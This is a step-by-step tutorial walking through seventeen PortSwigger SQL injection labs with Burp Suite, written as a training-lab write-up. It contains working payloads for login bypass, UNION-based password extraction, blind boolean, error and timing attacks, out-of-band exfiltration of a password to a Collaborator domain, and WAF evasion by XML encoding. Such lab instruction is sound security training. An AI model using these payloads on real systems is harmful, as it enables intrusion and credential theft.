# SQL Injection — From Zero to Extracting Passwords (Tutorial Style)

![Labs](https://img.shields.io/badge/Labs-17-blue) ![Track](https://img.shields.io/badge/Track-SQL%20Injection-orange) ![Level](https://img.shields.io/badge/Level-Beginner%20Friendly-brightgreen) ![Tool](https://img.shields.io/badge/Tool-Burp%20Suite%20Community-green)

> [!TIP]
> This isn't a reference manual. This is me walking you through, step by step, telling you exactly what to type and what you should see. If you've never used Burp before, that's fine — we'll learn it together as we go.

---

## Before We Start: What Is SQL Injection?

Imagine a login form that checks:
```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'password123'
```

Normally, you type your username and password, the database checks if they match, and either lets you in or doesn't.

But if the form is badly written, you can inject your own SQL commands into that query. For example, if you type `admin' --` as the username, the actual query becomes:
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = ...
```

See that `--`? In SQL, that's a comment. Everything after it gets ignored. So the password check never happens, and you're logged in as admin without knowing the password.

That's SQL injection in a nutshell. And the labs are going to teach you every variation of this trick.

---

## Lab 1: Breaking a Filter (Your First SQL Injection)

**What's happening:** A product website shows products by category. But "unreleased" products don't show up. Your job is to bypass that filter and see hidden products.

### Step 1: Open Burp and browse the site

- Open Burp Suite (you'll see the Proxy tab open by default).
- In your browser, go to the PortSwigger lab (the URL will be provided on the lab page).
- Click around and look for a product category link (something like "Gifts" or "Lifestyle").
- When you click it, you'll see the URL changes to something like: `https://...?category=Gifts`

### Step 2: Capture the request in Burp

- Burp's Proxy is already running and watching everything. Look at the **Proxy → HTTP history** tab — you'll see that request captured there.
- Find the one with `category=Gifts` in it and **right-click → Send to Repeater** (or just press `Ctrl+R`).

You've now opened the **Repeater** tab. This is where you'll modify the request and resend it over and over without going through the browser.

### Step 3: Inject your first payload

In the Repeater tab, you'll see your full HTTP request. Look for the line that says:
```
GET /filter?category=Gifts HTTP/1.1
```

Now you're going to modify `category=Gifts` to:
```
category=Gifts'--
```

Type it exactly like that — the single quote (`'`) and two dashes (`--`). Then click the **Send button** (or `Ctrl+U`).

Look at the response panel on the right. Scroll through it and look for products you didn't see before.

> [!TIP]
> **What just happened?** You added a single quote, which breaks out of the SQL string. The two dashes comment out the rest of the query. Suddenly the filter that hid unreleased products isn't there anymore — you're seeing everything.

**Expected result:** You see extra products (unreleased ones) in the response that weren't there before. If you do, you've just done your first SQL injection. ✅

**If you don't see extra products:**
- Make sure you typed the payload exactly: `Gifts'--` (no typos).
- Try adding a space after the dashes: `Gifts'-- ` (some databases need it).
- Check that you're looking at the right response panel (right side of Repeater, not left).

Once you see the extra products, **you're done with Lab 1.** Go back to PortSwigger and mark it as solved.

---

## Lab 2: Logging In Without a Password

**What's happening:** There's a login form. You know the username is `administrator`, but you don't know the password. Your job is to log in anyway.

### Step 1: Find the login form

- Go to the PortSwigger lab URL.
- Look for a **Login** button or link, and click it.
- You'll see a form with username and password fields.

### Step 2: Try the injection directly in the browser (no Burp needed this time)

In the **username field**, type:
```
administrator'--
```

In the **password field**, type anything (it doesn't matter). Just put `x` or anything.

Click **Login**.

> [!TIP]
> **What's happening?** The query behind the scenes was: `SELECT * FROM users WHERE username = 'administrator' AND password = 'x'`. But you broke out of the username string with `'--`, so it becomes: `SELECT * FROM users WHERE username = 'administrator' --' AND password ...` — the password check gets commented out and never runs.

**Expected result:** You're logged in as `administrator`. The page redirects to `/my-account` or shows "Welcome, administrator." If it does, **Lab 2 is solved.** ✅

**If it doesn't work:**
- Double-check you typed `administrator'--` with a single quote and two dashes.
- Some browsers trim trailing spaces — if you're not sure, do this in Burp Repeater instead: capture the login request in HTTP history, send to Repeater, modify the username parameter directly in the raw request, and resend.

---

## Lab 3: Finding How Many Columns Exist

**What's happening:** When you inject SQL, you're going to want to pull data from the database using `UNION SELECT`. But `UNION` requires that both parts of the query have the same number of columns. Your job is to figure out how many columns the original query returns.

### Step 1: Find the vulnerable request

- Go to the lab, browse to a product category (like you did in Lab 1).
- Send that request to Repeater again.

### Step 2: Test column counts

You're going to test different column numbers and see which one doesn't error. In Repeater, modify the category parameter to:
```
category=Gifts' ORDER BY 1--
```

Send it. Check the response for errors. You should see no error — the page loads normally.

Now change it to:
```
category=Gifts' ORDER BY 2--
```

Send it. Still no error?

Change it to:
```
category=Gifts' ORDER BY 3--
```

Send it. Still works?

Keep incrementing (4, 5, 6...) until you get an error. When you do, the number you were just testing is **too many columns**. So the real number is one less.

> [!NOTE]
> **What's `ORDER BY`?** It sorts results by a column number. If you say `ORDER BY 3` and there's no 3rd column, the database throws an error. So this tells you exactly how many columns exist.

**Expected result:** You find the exact column count (let's say it's 3) by seeing where `ORDER BY` stops working.

Once you know the number, **Lab 3 is solved.** ✅

---

## Lab 4: Finding Which Column Shows Text

**What's happening:** You know there are 3 columns. But which one actually gets displayed on the page? You need to know this before you can pull useful data.

### Step 1: Same request as Lab 3

Use the same category request in Repeater. Now you're going to test which column shows up on the page.

### Step 2: Inject placeholder text

Change the category parameter to:
```
category=Gifts' UNION SELECT 'A',NULL,NULL--
```

Send it. Look at the response HTML and search (Ctrl+F) for the letter `A`. 

Did you find it rendered on the page somewhere? If yes, column 1 is the displayable one.

If not, try:
```
category=Gifts' UNION SELECT NULL,'A',NULL--
```

Send it. Search for `A` again.

Keep moving the `'A'` to each position (1, 2, 3) until you find it displayed on the page.

> [!TIP]
> **What's happening?** `UNION SELECT 'A',NULL,NULL` is saying "give me a row with 'A' in the first column and nothing in the others." If `'A'` shows up on the page, that's your answer.

**Expected result:** You find which column position (1, 2, or 3) renders as visible text on the page.

Once you know it, **Lab 4 is solved.** ✅

---

## Lab 5: Pulling Actual Data

**What's happening:** Now that you know which column shows text, you're going to replace `'A'` with real data from the database — specifically usernames and passwords from a `users` table.

### Step 1: Same request again

Use Repeater with the category request. But now you know:
- There are 3 columns
- Column 2 (or wherever) shows text

### Step 2: Pull usernames and passwords

Replace the payload with:
```
category=Gifts' UNION SELECT username,password,NULL FROM users--
```

(Put the username and password in the columns you found. If column 1 shows text, put username and password in columns 1 and 2 instead.)

Send it.

> [!TIP]
> **What's happening?** You're telling the database: "Instead of showing me products, show me usernames and passwords from the users table." And the page displays them for you because you know which columns are visible.

**Expected result:** Usernames and passwords appear directly on the page where product info would normally be.

Once you see credentials, **Lab 5 is solved.** ✅

---

## Lab 6: Combining Multiple Columns Into One

**What's happening:** Lab 5 worked, but what if the page only displays one visible column? You'd only see either the username OR the password, not both. This lab teaches you to combine them into a single visible value.

### Step 1: Same setup

Let's say only column 1 is visible on the page, and you need both username and password.

### Step 2: Concatenate with a separator

Depending on the database type, use one of these:

**If it's MySQL:**
```
category=Gifts' UNION SELECT CONCAT(username,'~',password),NULL,NULL FROM users--
```

**If it's Oracle/PostgreSQL:**
```
category=Gifts' UNION SELECT username || '~' || password,NULL,NULL FROM users--
```

**If it's SQL Server:**
```
category=Gifts' UNION SELECT username + '~' + password,NULL,NULL FROM users--
```

Send it.

> [!TIP]
> **What's the `~`?** It's just a separator. You're smooshing username and password together with `~` in between, so you get something like `admin~password123` as one string in the visible column.

**Expected result:** You see both username and password rendered as one value, separated by `~`.

Once you see them combined, **Lab 6 is solved.** ✅

---

## Lab 7 & 8: Figuring Out What Database You're On

**What's happening:** Different databases have different syntax. Before you go further, you need to know which one you're dealing with. This is called "fingerprinting."

### Step 1: Test the database type

Use the category request in Repeater. Try this payload:
```
category=Gifts' UNION SELECT @@version,NULL,NULL--
```

Send it.

> [!NOTE]
> **What's `@@version`?** In MySQL and SQL Server, this gives you the database version. It's a quick fingerprint.

**If this works and shows a version:**
- It says "MySQL" or "MariaDB" → you're on **MySQL**.
- It says "Microsoft SQL Server" → you're on **SQL Server**.

**If you get an error saying "unknown variable @@version" or something:**
- You're probably on **Oracle**. Try instead:
```
category=Gifts' UNION SELECT banner,NULL FROM v$version--
```

**Expected result:** You see the database version, and now you know which syntax to use going forward.

Once you identify it, **Labs 7 & 8 are solved.** ✅

---

## Lab 9 & 10: Finding Table Names You Don't Know

**What's happening:** In real-world hacking, you won't always know the table names. There's usually a system table called `information_schema` that stores information about all tables and columns. You're going to query that to discover what tables exist.

### Step 1: List all tables

Use the category request. Try this:
```
category=Gifts' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
```

Send it.

You'll see a big list of table names dump on the page.

> [!TIP]
> **What just happened?** Every database has a hidden system table (`information_schema.tables` on MySQL/PostgreSQL/SQL Server, or `all_tables` on Oracle) that contains the names of all user tables. You just queried it.

### Step 2: Find columns in a table

Look through that list and find an interesting table (maybe `users_abc` or `admin_table`). Let's say you find `users_abcd1234`. Now query the columns in that table:
```
category=Gifts' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users_abcd1234'--
```

Send it.

You'll see a list of columns like `username`, `password`, `email`, etc.

### Step 3: Extract the real data

Now you know the exact table name and column names. Pull the data:
```
category=Gifts' UNION SELECT username,password,NULL FROM users_abcd1234--
```

Send it.

**Expected result:** You discover hidden tables and their columns, then extract real data.

Once you've done this discovery process, **Labs 9 & 10 are solved.** ✅

---

## Lab 11: Blind SQL Injection — The Hard Mode (Conditional Responses)

This one is different. There's no visible output. You have to ask yes/no questions and listen for tiny signals. Let me walk you through it carefully.

**What's happening:** The app doesn't show you database contents directly. But it shows a "Welcome back!" message when you're logged in correctly, and nothing when you're not. You're going to use that as your only signal to extract passwords.

### Step 1: Understand the oracle

Go to the lab. The page should show "Welcome back!" normally. In Burp, capture any request (go to **Proxy → HTTP history** and find any request with a `TrackingId` cookie).

Send it to Repeater.

Now modify that cookie from whatever it is to:
```
TrackingId=xyz' AND '1'='1
```

Send it. Look for "Welcome back!" in the response.

Now change it to:
```
TrackingId=xyz' AND '1'='2
```

Send it. Look for "Welcome back!" — it should be gone now.

> [!TIP]
> **What's happening?** '1'='1' is always true, so "Welcome back!" appears. '1'='2' is always false, so "Welcome back!" disappears. This is your oracle — yes/no signals based on whether your condition is true.

### Step 2: Confirm the username exists

In Repeater, now try:
```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

Send it. Do you see "Welcome back!"? If yes, the `administrator` username exists. Good.

### Step 3: Find the password length

Now here's where Burp Intruder comes in. You're going to ask: "Is the password longer than 1 character? 2? 3?" etc.

**Send your current request to Intruder:**
- In Repeater, right-click → **Send to Intruder** (or `Ctrl+I`).

You're now in the **Intruder** tab. This tool automates testing many variations of your request.

**Set up the payload position:**
- Look at the payload. Find this part: `LENGTH(password)>1`
- Highlight just the `1` (not the whole number position, just the digit).
- Click the **"Add §"** button in the toolbar above.

Now it should look like:
```
LENGTH(password)>§1§
```

> [!NOTE]
> Those `§` symbols mean "this part changes each time I send the request."

**Set up Intruder to test numbers:**
- At the top of the Positions tab, you'll see **"Attack type"**. Change it to **"Sniper"**.
- Go to the **"Payloads"** tab.
- Under **"Payload type"**, choose **"Numbers"**.
- Set range: **From 0 to 100, Step 1**.

### Step 4: Tell Intruder to highlight the signal

When Intruder runs, it will send 100 requests. You don't want to read 100 responses by hand. So:

- Go to the **"Settings"** tab (or **"Options"** in older versions).
- Find **"Grep - Match"** and click it.
- Click **"Add"**.
- Type: `Welcome back`
- Click **"Start attack"**.

> [!TIP]
> **What's Grep Match?** It scans every response for that phrase and marks it with a ✓ if found, ✗ if not. So you get a simple column: ✓✓✓✓✗✗✗. Much easier than reading 100 responses.

### Step 5: Read the result

Intruder will run and show a table. Look for the `Welcome back` column. You'll see a bunch of ✓ marks, then suddenly they flip to ✗.

The last ✓ tells you the password length. Example:
- `LENGTH(password)>19` = ✓ (true, password is longer than 19)
- `LENGTH(password)>20` = ✗ (false, password is NOT longer than 20)

This means the password is exactly 20 characters long.

> [!TIP]
> **Stuck reading the results?** Click the `Welcome back` column header to sort it. All ✓ will group together, then all ✗.

### Step 6: Extract each character

Now you know the password is 20 characters. Time to guess each character position.

**Go back to Repeater** and create a new payload that tests character by character:
```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND SUBSTRING(password,1,1)='a')='a
```

This says: "Is the 1st character of the password equal to 'a'?"

Send it in Repeater to test — you should see "Welcome back!" only if that character is correct.

Now here's the trick: you need to test 20 positions × 36 characters (a-z, 0-9). That's 720 combinations. **Send this to Intruder again.**

**Set up two payload positions:**
- Highlight the `1` in `SUBSTRING(password,§1§,1)`
- Click **"Add §"**.
- Highlight the `a` in `='§a§'`
- Click **"Add §"** again.

Now you have two `§...§` markers.

**Change attack type to "Cluster Bomb"** (at the top of Positions tab).

> [!NOTE]
> **Sniper** = one thing changes. **Cluster Bomb** = TWO things change independently (position 1 through 20, AND character a-z, 0-9).

**Set up Payloads:**
- There's a dropdown at the top of the Payloads tab: "Payload set 1" and "Payload set 2".
- **Payload set 1**: Numbers, from 1 to 20, step 1.
- **Payload set 2**: Simple list. Type each character: `a`, `b`, `c`... `z`, `0`, `1`... `9` (one per line, or copy-paste a list).

**Add Grep Match:**
- Go to Settings → Grep Match → add `Welcome back` again.
- **Start attack.**

### Step 7: Read the massive result table

Intruder will send 720 requests. You'll get a huge table.

To find the password:
- Sort by position (1st column).
- For each position (1, 2, 3...), look for the ONE row that has a ✓ in the `Welcome back` column.
- That's your character for that position.

Do this for all 20 positions and you've assembled the password.

**Example:**
```
Position 1: a=✓ (first character is 'a')
Position 2: d=✓ (second character is 'd')
Position 3: m=✓ (third character is 'm')
...
Position 20: 9=✓ (last character is '9')
```

Password: `adm...9`

### Step 8: Log in

Once you have all 20 characters, go to the login page and log in with:
```
Username: administrator
Password: [the password you extracted]
```

You should be logged in. **Lab 11 is solved.** ✅

---

## Lab 12: Blind SQL Injection with Errors

**What's happening:** Lab 11 showed a signal (the "Welcome back!" text). But sometimes there's no visible signal at all. Instead, the database throws an error when a condition is true, and no error when false. You use that as your oracle.

### Step 1: Test the error signal

In Repeater, try:
```
TrackingId=xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

Send it. You should get a **500 Internal Server Error**.

Now try:
```
TrackingId=xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
```

Send it. You should get a **200 OK** (no error).

> [!TIP]
> **What's happening?** `1/0` is division by zero — it forces an error. If the condition is true, you get the error. If false, you get no error. That's your new oracle.

### Step 2: Use the same Intruder setup as Lab 11

Same process:
- Set up Intruder with positions for `LENGTH(password)>§1§`
- Change attack type to **Sniper**
- Instead of Grep Match, watch the **Status** column in the results.
- TRUE condition = 500 error, FALSE = 200 OK.
- Find where it flips from 500 to 200 — that's your password length.

Then:
- Extract each character with Cluster Bomb, same way as Lab 11.
- Look for rows that show **500** status (those are the correct characters).

**Expected result:** Same as Lab 11 — you extract the password and log in.

Once you log in, **Lab 12 is solved.** ✅

---

## Lab 13 & 14: Blind SQL Injection with Time Delays

**What's happening:** Now there's no visible signal, no error signal. The ONLY signal is: how long does the response take? If a condition is true, you make the database sleep for 5 seconds. If false, it returns instantly. You listen for the delay.

### Step 1: Test the delay

In Repeater, try (if it's MySQL):
```
TrackingId=xyz'; SELECT SLEEP(5)--
```

Send it. Watch the **response time** indicator in the bottom right of Repeater. It should take ~5+ seconds.

Now try without the delay:
```
TrackingId=xyz'--
```

Send it. Should be instant.

> [!TIP]
> **What's happening?** `SLEEP(5)` makes the database pause for 5 seconds. That's your signal. True = slow, False = fast.

### Step 2: Make it conditional

Now make the sleep conditional:
```
TrackingId=xyz'; IF (SELECT COUNT(username) FROM users WHERE username='administrator' AND LENGTH(password)>1) = 1 WAITFOR DELAY '0:0:5'--
```

(This syntax is for SQL Server. For MySQL, use `SELECT SLEEP(5)`. For PostgreSQL, use `pg_sleep(5)`.)

### Step 3: Use Intruder with the time signal

- Set up Intruder like before with `LENGTH(password)>§1§`.
- Sniper attack type.
- **Don't use Grep Match** — instead, watch the **"Time received"** or **"Response received"** column.
- True length = ~5+ second response. False = instant response.
- Sort by time and find where it jumps.

Same logic for character extraction with Cluster Bomb — the slow response is your correct guess.

**Expected result:** You extract the password by listening for the slow responses.

Once you log in, **Labs 13 & 14 are solved.** ✅

---

## Lab 15 & 16: Out-of-Band Exploitation

**What's happening:** Sometimes there's NO signal at all — no visible output, no error, no timing difference. In this case, you force the database to reach OUT to the internet and contact your server. That contact itself is the proof of exploitation.

### Step 1: Get a Collaborator domain

- In Burp, go to the **Collaborator** tab.
- Click **"Copy to clipboard"** — this gives you a unique domain like `abc123xyz.burpcollaborator.net`.

### Step 2: Make the database contact it

In Repeater, try (for SQL Server):
```
'; EXEC master..xp_dirtree '\\abc123xyz.burpcollaborator.net\a'--
```

Send it. The database will try to connect to that domain.

### Step 3: Check if it called you

- Go back to the **Collaborator** tab.
- Click **"Poll now"**.
- You should see a logged DNS lookup showing the database tried to contact your domain.

> [!TIP]
> **What just happened?** You forced the database to make a DNS lookup to your Collaborator domain. That lookup is logged, proving the SQL injection executed, even though you got zero feedback from the page itself.

### Step 4 (Lab 16): Exfiltrate data through the domain name

Instead of just proving exploitation, you can smuggle data in the domain itself:

```
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.abc123xyz.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual--
```

(This is Oracle syntax; it's DB-specific.)

Send it. Then poll Collaborator again. The DNS lookup will show the password embedded in the domain name itself, like: `password123.abc123xyz.burpcollaborator.net`.

**Expected result:** Data exfiltrated through DNS.

Once you see the password in Collaborator, **Labs 15 & 16 are solved.** ✅

---

## Lab 17: Bypass a WAF with Encoding

**What's happening:** Some websites have a Web Application Firewall (WAF) that blocks obvious SQL injection attempts. But if you encode your payload in XML format, it might slip through.

### Step 1: Identify the XML request

- This lab sends data in XML format (not a URL parameter).
- In Burp history, find a request with an XML body (something with `<productId>` tags).
- Send it to Repeater.

### Step 2: Encode your payload

Your normal SQLi payload might be:
```
' OR '1'='1
```

But the WAF blocks it. So encode it in XML:
- `'` becomes `&#x27;`
- ` ` (space) becomes `%20` or just leave it

So: `&#x27; OR &#x27;1&#x27;=&#x27;1`

### Step 3: Inject the encoded payload

In the XML request body, find the parameter you want to inject (let's say `productId`) and change it to your encoded payload.

Send it.

> [!TIP]
> **What happened?** The WAF checked the raw XML text, saw `&#x27;` instead of `'`, and didn't recognize it as SQL injection. But the backend decoded it back to normal SQL and executed it normally.

**Expected result:** The WAF doesn't block the request, and the underlying SQL injection works as normal.

Once it works, **Lab 17 is solved.** ✅

---

## Quick Reference: What's Different Between Labs

| Lab | Signal | Technique |
|---|---|---|
| 1-6 | Visible output (data on page) | UNION SELECT |
| 7-8 | Visible output (version info) | UNION + DB fingerprint |
| 9-10 | Visible output (table names) | information_schema query |
| 11 | Text appears/disappears | Conditional "Welcome back!" |
| 12 | Error appears/disappears | Conditional error (1/0) |
| 13-14 | Response time | SLEEP() or WAITFOR |
| 15-16 | DNS callback | Out-of-band via Collaborator |
| 17 | Bypass WAF | XML encoding |

---

## General Mindset

Every lab is asking the database **yes/no questions** using a different method to get the answer:
- **Labs 1-10:** "Show me the answer directly on the page."
- **Labs 11-14:** "Tell me yes/no through this signal (text, error, or time)."
- **Labs 15-16:** "Call me back on the internet to prove you heard me."
- **Lab 17:** "Can you hear me if I speak in code?"

Once you understand this pattern, every lab becomes the same game: find the signal, ask questions, extract answers.

---

*Part of the 90-day cybersecurity roadmap — Phase 1 (Web/PortSwigger track). Walk through, not a reference manual.*
